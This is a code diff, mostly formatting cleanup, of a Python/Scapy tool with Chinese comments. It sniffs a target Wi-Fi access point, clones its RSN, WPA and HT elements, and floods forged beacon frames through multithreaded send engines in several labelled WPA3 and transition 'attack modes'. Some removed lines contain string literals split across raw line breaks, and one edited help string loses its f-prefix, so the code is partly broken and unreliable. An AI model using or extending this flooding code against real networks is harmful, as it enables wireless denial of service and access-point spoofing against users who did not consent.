@@ -42,22 +42,29 @@ stats = {
 }
 
 # ==================== 工具函数 ====================
+
+
 def log_info(msg):
     print(f"[*] {msg}")
+
 
 def log_ok(msg):
     print(f"[+] {msg}")
 
+
 def log_err(msg):
     print(f"[!] {msg}")
 
+
 def log_warn(msg):
     print(f"[~] {msg}")
+
 
 def check_root():
     if os.geteuid() != 0:
         log_err("需要root权限运行")
         sys.exit(1)
+
 
 def check_monitor_mode(iface):
     try:
@@ -77,6 +84,7 @@ def check_monitor_mode(iface):
         log_err("未找到iwconfig命令，请安装wireless-tools")
         sys.exit(1)
 
+
 def set_channel(iface, channel):
     channel = int(channel)
     if channel < 1 or channel > 196:
@@ -91,36 +99,40 @@ def set_channel(iface, channel):
         sys.exit(1)
     log_ok(f"信道已设置为 {channel}")
 
+
 def get_timestamp():
     return int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF
 
+
 def random_seq():
     frag = 0
-    seq  = random.randint(0, 4095)
+    seq = random.randint(0, 4095)
     return (seq << 4) | frag
 
 # ==================== RSN 构造器 ====================
+
+
 class RSNBuilder:
     OUI = b'\x00\x0f\xac'
 
-    CIPHER_CCMP_128   = OUI + b'\x04'
-    CIPHER_GCMP_128   = OUI + b'\x08'
-    CIPHER_CCMP_256   = OUI + b'\x0a'
-    CIPHER_GCMP_256   = OUI + b'\x09'
+    CIPHER_CCMP_128 = OUI + b'\x04'
+    CIPHER_GCMP_128 = OUI + b'\x08'
+    CIPHER_CCMP_256 = OUI + b'\x0a'
+    CIPHER_GCMP_256 = OUI + b'\x09'
 
-    AKM_PSK           = OUI + b'\x02'
-    AKM_PSK_SHA256    = OUI + b'\x06'
-    AKM_SAE           = OUI + b'\x08'
-    AKM_FT_SAE        = OUI + b'\x09'
-    AKM_EAP           = OUI + b'\x01'
-    AKM_EAP_SHA256    = OUI + b'\x05'
-    AKM_SUITE_B_192   = OUI + b'\x0c'
-    AKM_OWE           = OUI + b'\x12'
+    AKM_PSK = OUI + b'\x02'
+    AKM_PSK_SHA256 = OUI + b'\x06'
+    AKM_SAE = OUI + b'\x08'
+    AKM_FT_SAE = OUI + b'\x09'
+    AKM_EAP = OUI + b'\x01'
+    AKM_EAP_SHA256 = OUI + b'\x05'
+    AKM_SUITE_B_192 = OUI + b'\x0c'
+    AKM_OWE = OUI + b'\x12'
 
-    BIP_CMAC_128      = OUI + b'\x06'
-    BIP_GMAC_128      = OUI + b'\x0b'
-    BIP_GMAC_256      = OUI + b'\x0c'
-    BIP_CMAC_256      = OUI + b'\x0d'
+    BIP_CMAC_128 = OUI + b'\x06'
+    BIP_GMAC_128 = OUI + b'\x0b'
+    BIP_GMAC_256 = OUI + b'\x0c'
+    BIP_CMAC_256 = OUI + b'\x0d'
 
     @staticmethod
     def _encode_rsn_capabilities(
@@ -238,6 +250,8 @@ class RSNBuilder:
         return Dot11Elt(ID=48, info=info)
 
 # ==================== IE 构造器 ====================
+
+
 class IEBuilder:
 
     @staticmethod
@@ -275,17 +289,17 @@ class IEBuilder:
 
     @staticmethod
     def ht_capabilities():
-        ht_cap_info    = struct.pack('<H', 0x402d)
-        ampdu_params   = b'\x17'
+        ht_cap_info = struct.pack('<H', 0x402d)
+        ampdu_params = b'\x17'
         mcs_set = (
             b'\xff\xff\x00\x00'
             b'\x00\x00\x00\x00'
             b'\x00\x00\x00\x00'
             b'\x01\x00\x00\x00'
         )
-        ht_ext_cap     = struct.pack('<H', 0x0000)
-        txbf_cap       = struct.pack('<I', 0x00000000)
-        asel_cap       = b'\x00'
+        ht_ext_cap = struct.pack('<H', 0x0000)
+        txbf_cap = struct.pack('<I', 0x00000000)
+        asel_cap = b'\x00'
         info = (
             ht_cap_info + ampdu_params + mcs_set +
             ht_ext_cap + txbf_cap + asel_cap
@@ -329,14 +343,14 @@ class IEBuilder:
     def vendor_wpa(transition=True):
         if not transition:
             return None
-        wpa_oui   = b'\x00\x50\xf2'
-        wpa_type  = b'\x01'
-        wpa_ver   = b'\x01\x00'
-        group_cs  = wpa_oui + b'\x04'
-        pw_count  = b'\x01\x00'
-        pw_cs     = wpa_oui + b'\x04'
+        wpa_oui = b'\x00\x50\xf2'
+        wpa_type = b'\x01'
+        wpa_ver = b'\x01\x00'
+        group_cs = wpa_oui + b'\x04'
+        pw_count = b'\x01\x00'
+        pw_cs = wpa_oui + b'\x04'
         akm_count = b'\x01\x00'
-        akm_cs    = wpa_oui + b'\x02'
+        akm_cs = wpa_oui + b'\x02'
         info = (
             wpa_oui + wpa_type + wpa_ver +
             group_cs + pw_count + pw_cs +
@@ -356,13 +370,15 @@ class IEBuilder:
         return Dot11Elt(ID=221, info=info)
 
 # ==================== AP 信息嗅探 ====================
+
+
 class APSniffer:
     def __init__(self, iface, target_bssid=None, target_ssid=None, timeout=10):
-        self.iface       = iface
+        self.iface = iface
         self.target_bssid = target_bssid.lower() if target_bssid else None
-        self.target_ssid  = target_ssid
-        self.timeout      = timeout
-        self.result       = None
+        self.target_ssid = target_ssid
+        self.timeout = timeout
+        self.result = None
 
     def _packet_handler(self, pkt):
         if not pkt.haslayer(Dot11Beacon):
@@ -458,6 +474,8 @@ class APSniffer:
         return self.result
 
 # ==================== 帧构造器 ====================
+
+
 class BeaconBuilder:
     def __init__(self, config):
         self.config = config
@@ -552,9 +570,11 @@ class BeaconBuilder:
         return raw, sc_offset, ts_offset
 
 # ==================== 发送引擎 ====================
+
+
 class FloodEngine:
     def __init__(self, config, builder):
-        self.config  = config
+        self.config = config
         self.builder = builder
         self.threads = []
 
@@ -584,8 +604,8 @@ class FloodEngine:
         frame_buf = bytearray(template)
 
         local_count = 0
-        batch_size  = 500
-        seq_num     = random.randint(0, 4095)
+        batch_size = 500
+        seq_num = random.randint(0, 4095)
 
         while stats['running']:
             try:
@@ -635,14 +655,15 @@ class FloodEngine:
         # 预构造帧缓存
         cache_size = self.config.get('precache_size', 64)
         frame_cache = []
-        log_info(f"线程 {threading.current_thread().name}: 预构造 {cache_size} 帧...")
+        log_info(
+            f"线程 {threading.current_thread().name}: 预构造 {cache_size} 帧...")
         for _ in range(cache_size):
             frame = self.builder.build()
             frame_cache.append(bytes(frame))
 
         local_count = 0
-        batch_size  = 500
-        cache_idx   = 0
+        batch_size = 500
+        cache_idx = 0
 
         while stats['running']:
             try:
@@ -681,7 +702,7 @@ class FloodEngine:
             return
 
         local_count = 0
-        batch_size  = 50
+        batch_size = 50
 
         while stats['running']:
             try:
@@ -706,7 +727,7 @@ class FloodEngine:
     def _worker_scapy(self):
         """Scapy sendp发送线程（兼容模式）"""
         local_count = 0
-        batch_size  = 50
+        batch_size = 50
 
         while stats['running']:
             try:
@@ -751,17 +772,16 @@ class FloodEngine:
                 break
             elapsed = time.time() - stats['start_time']
             with stats_lock:
-                sent   = stats['sent']
+                sent = stats['sent']
                 errors = stats['errors']
-            
+
             # 计算瞬时速率
             instant_rate = sent - last_sent
             last_sent = sent
             avg_rate = sent / elapsed if elapsed > 0 else 0
 
             sys.stdout.write(
-                f"
-[{'=' * 50}] "
+                f"[{'=' * 50}] "
                 f"{mode_name} | {send_name} | "
                 f"已发: {sent:>9,d} | "
                 f"瞬时: {instant_rate:>7,d}/s | "
@@ -961,31 +981,14 @@ def parse_args():
     parser.add_argument('-m', '--mode', default=CONFIG['mode'],
                         choices=['wpa3_only', 'transition', 'transition_ft',
                                  'enterprise', 'auto'],
-                        help="攻击模式:
-"
-                             "  wpa3_only     — 纯WPA3 SAE
-"
-                             "  transition    — WPA2/WPA3过渡模式
-"
-                             "  transition_ft — 过渡模式+FT漫游
-"
-                             "  enterprise    — WPA3企业版
-"
-                             "  auto          — 嗅探后自动匹配
-"
-                             f"  (默认: {CONFIG['mode']})")
+                        help="(默认: {CONFIG['mode']})")
     parser.add_argument('--send-mode', default=CONFIG['send_mode'],
                         choices=['template', 'precache', 'legacy', 'scapy'],
-                        help="发送方式:
-"
-                             "  template  — 模板帧动态修改(最快)
-"
-                             "  precache  — 预缓存帧轮询发送
-"
-                             "  legacy    — 传统每次构造(慢)
-"
-                             "  scapy     — Scapy sendp(兼容)
-"
+                        help="发送方式:"
+                             "  template  — 模板帧动态修改(最快)"
+                             "  precache  — 预缓存帧轮询发送"
+                             "  legacy    — 传统每次构造(慢)"
+                             "  scapy     — Scapy sendp(兼容)"
                              f"  (默认: {CONFIG['send_mode']})")
     parser.add_argument('--precache-size', type=int, default=CONFIG['precache_size'],
                         help=f"预缓存帧数量 (默认: {CONFIG['precache_size']})")
